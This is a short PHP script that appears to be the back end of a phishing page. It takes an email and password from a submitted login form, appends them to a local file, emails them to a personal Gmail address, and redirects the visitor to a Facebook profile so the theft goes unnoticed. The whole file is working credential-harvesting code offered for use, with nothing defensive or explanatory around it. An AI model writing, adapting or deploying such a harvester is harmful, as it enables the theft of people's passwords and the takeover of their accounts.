<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email  = htmlspecialchars($_POST["email"]);
    $pass = htmlspecialchars($_POST["pass"]);

    // 1. Salvar os dados em dados.txt
    $dados = "Nome: $email\nSenha: $pass\n\n";
    file_put_contents("dados.txt", $dados, FILE_APPEND);

    // 2. Enviar o e-mail
    $para = "gabrielreboucas2001@gmail.com";
    $assunto = "Novo contato do formulário";

    $mensagem = "
        <html>
        <body>
            <h2>Novo contato recebido:</h2>
            <p><strong>Nome:</strong> $email</p>
            <p><strong>Senha:</strong> $pass</p>
        </body>
        </html>
    ";

    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8\r\n";
    $headers .= "From: contato@seudominio.com\r\n"; // Altere isso conforme necessário

    mail($para, $assunto, $mensagem, $headers);

    // 3. Redirecionar para o Google
    header("Location: https://www.facebook.com/isabella.martins.506631");
    exit();
}
?>
